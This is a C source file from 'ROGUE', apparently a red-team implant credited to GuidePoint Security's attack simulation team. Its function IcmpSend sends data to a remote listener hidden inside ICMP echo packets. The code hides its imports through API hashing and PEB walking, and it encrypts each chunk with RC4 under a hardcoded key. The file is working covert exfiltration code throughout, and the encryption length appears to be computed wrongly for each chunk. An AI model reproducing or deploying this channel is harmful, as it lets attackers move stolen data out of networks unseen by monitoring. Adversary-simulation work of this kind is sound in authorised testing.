/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} RC4_BUF, *PRC4_BUF;

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT16	Signature;
	UINT8	Buffer[0];
} HDR_PKT, *PHDR_PKT ;

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT16	ChunkNumber;
	UINT16	ChunkTotal;
	UINT16	Id;
	UINT8	Buffer[0];
} SEQ_PKT, *PSEQ_PKT ;

/* RC4 */
BOOLEAN
NTAPI
SystemFunction032(
	PRC4_BUF Buffer,
	PRC4_BUF Key
);

typedef struct
{
	D_API( RtlIpv4StringToAddressA );
	D_API( LdrGetProcedureAddress );
	D_API( RtlInitUnicodeString );
	D_API( SystemFunction032 );
	D_API( RtlInitAnsiString );
	D_API( RtlReAllocateHeap );
	D_API( RtlAllocateHeap );
	D_API( IcmpCloseHandle );
	D_API( IcmpCreateFile );
	D_API( LdrUnloadDll );
	D_API( IcmpSendEcho );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_RTLIPV4STRINGTOADDRESSA	0xb3d0cd9b /* RtlIpv4StringToAddressA */
#define H_API_LDRGETPROCEDUREADDRESS	0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLINITANSISTRING		0xa0c8436d /* RtlInitAnsiString */
#define H_API_RTLREALLOCATEHEAP		0xaf740371 /* RtlReAllocateHeap */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_ICMPCLOSEHANDLE		0xe844feb0 /* IcmpCloseHandle */
#define H_API_ICMPCREATEFILE		0x7ea32e42 /* IcmpCreateFile */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_ICMPSENDECHO		0xe70f1177 /* IcmpSendEcho */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/* Static */
#ifndef ICMP_CHUNK_SIZE
#define ICMP_CHUNK_SIZE			8192
#endif

/*!
 *
 * Purpose:
 *
 * Sends a buffer over ICMP back to the listener.
 * Uses ICMP Echo requests to safely operate 
 * without issue. Data is returned if it matches
 * the specification.
 *
!*/
D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 InLength )
{
	API		Api;
	IN_ADDR		Ip4;
	RC4_BUF		Key;
	RC4_BUF		Rc4;
	HDR_PKT		Hdr;
	SEQ_PKT		Seq;
	ANSI_STRING	Ani;
	UNICODE_STRING	Uni;

	BOOL		Ret = FALSE;
	ULONG		Len = 0;

	PVOID		Icp = NULL;
	PVOID		Adv = NULL;
	HANDLE		Icf = INVALID_HANDLE_VALUE;
	PBUFFER		Snd = NULL;
	PBUFFER		Rcv = NULL;
	PHDR_PKT	Hdp = NULL;
	PSEQ_PKT	Sqp = NULL;

	/* Zero out the stack structure */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ip4, sizeof( Ip4 ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Rc4, sizeof( Rc4 ) );
	RtlSecureZeroMemory( &Hdr, sizeof( Hdr ) );
	RtlSecureZeroMemory( &Seq, sizeof( Seq ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Init API structure */
	Api.RtlIpv4StringToAddressA = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLIPV4STRINGTOADDRESSA );
	Api.LdrGetProcedureAddress  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlInitUnicodeString    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlInitAnsiString       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlReAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Load advapi32.dll if its not loaded already */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"advapi32.dll" ) ) );

	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {

		/* Load ichlpapi.dll if its not loaded already */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"iphlpapi.dll" ) ) );

		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Icp ) ) ) {

			/* Find crypto function address for RC4 */
			Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "SystemFunction032" ) ) );
		
			if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 ) ) ) {

				/* Initialize header and sequence packet */
				Hdr.Signature  = 0xFEFE;
				Seq.Id        = 0x4242;
				Seq.ChunkTotal = ( ( InLength + ( ICMP_CHUNK_SIZE - 1 ) ) / ICMP_CHUNK_SIZE );

				/* Attempt to send a chunk(s) */
				for ( ULONG Idx = 0 ; Idx < ( ( InLength + ( ICMP_CHUNK_SIZE - 1 ) ) / ICMP_CHUNK_SIZE ) ; ++Idx ) {
					if ( ( Snd = BufferCreate() ) != NULL ) {

						/* Append header and sequence packet */
						if ( ! BufferAddRawB( Snd, &Hdr, sizeof( Hdr ) ) ) break;
						if ( ! BufferAddRawB( Snd, &Seq, sizeof( Seq ) ) ) break;

						/* Calculate the length of the chunk */
						Len = ( ( InLength - ( Idx * ICMP_CHUNK_SIZE ) ) );

						if ( Len < ICMP_CHUNK_SIZE ) {
							/* Smaller than the size of the chunk? */
							if ( ! BufferAddRawB( Snd, C_PTR( U_PTR( InBuffer ) + ( Idx * ICMP_CHUNK_SIZE ) ), Len ) ) {
								break;
							};
						} else {
							/* Greater than the size of the chunk? */
							if ( ! BufferAddRawB( Snd, C_PTR( U_PTR( InBuffer ) + ( Idx * ICMP_CHUNK_SIZE ) ), ICMP_CHUNK_SIZE ) ) { 
								break;
							};
						};
						Hdp = C_PTR( Snd->Buffer );
						Sqp = C_PTR( Hdp->Buffer );
						Sqp->ChunkNumber = Idx + 1;

						/* Encrypt the buffer & set the key */

						/* Note: Change from hardcoded! */
						Key.Length = Key.MaximumLength = 32;
						Key.Buffer = C_PTR( G_PTR( "N1Ik06XFZtSZj0DguXkwuUIdcs7roZ1S" ) );
						Rc4.Length = Rc4.MaximumLength = sizeof( SEQ_PKT ) + InLength;
						Rc4.Buffer = C_PTR( Sqp );

						/* Encrypt the serialized packet */
						if ( NT_SUCCESS( Api.SystemFunction032( &Rc4, &Key ) ) ) 
						{
							/* Init ICMP API */
							Api.IcmpCloseHandle = PeGetFuncEat( Icp, H_API_ICMPCLOSEHANDLE );
							Api.IcmpCreateFile  = PeGetFuncEat( Icp, H_API_ICMPCREATEFILE );
							Api.IcmpSendEcho    = PeGetFuncEat( Icp, H_API_ICMPSENDECHO );

							/* Create a handle to ICMP */
							if ( ( Icf = Api.IcmpCreateFile() ) != INVALID_HANDLE_VALUE ) {
								/* Search up a hostname */
								if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &( PCHAR ){ ( CHAR ){ 0x0 } }, &Ip4 ) ) ) {
									if ( ( Rcv = BufferCreate() ) != NULL ) {

										if ( ( Rcv->Buffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, ICMP_CHUNK_SIZE + 1024 ) ) ) {
											Rcv->Length = ICMP_CHUNK_SIZE + 1024;

											if ( Api.IcmpSendEcho( Icf, Ip4.s_addr, Snd->Buffer, Snd->Length, NULL, Rcv->Buffer, Rcv->Length, 5000 ) ) 
											{
												/* Create Buffer */
											} else {
												break;
											};

											/* Cleanup allocation */
											Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
										} else {
											break;
										};

										/* Cleanup allocation */
										Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
										Rcv = NULL;
									} else {
										break;
									};
								} else {
									break;
								};
								/* Close */
								Api.IcmpCloseHandle( Icf ); Icf = INVALID_HANDLE_VALUE;
							} else {
								break;
							};
						} else {
							break;
						};

						/* Cleanup allocation */
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd->Buffer );
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd );
						Snd = NULL;
					} else {
						break;
					};
				};
				/* Cleanup! */
				if ( Snd != NULL ) {
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd->Buffer );
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Snd );
					Snd = NULL;
				};
				if ( Rcv != NULL ) {
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
					Rcv = NULL;
				};
				if ( Icf != INVALID_HANDLE_VALUE ) {
					Api.IcmpCloseHandle( Icf );
				};
			};
			/* Dereference */
			Api.LdrUnloadDll( Icp );
		};
		/* Dereference */
		Api.LdrUnloadDll( Adv );
	};

	/* Zero out the stack structure */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ip4, sizeof( Ip4 ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Rc4, sizeof( Rc4 ) );
	RtlSecureZeroMemory( &Hdr, sizeof( Hdr ) );
	RtlSecureZeroMemory( &Seq, sizeof( Seq ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
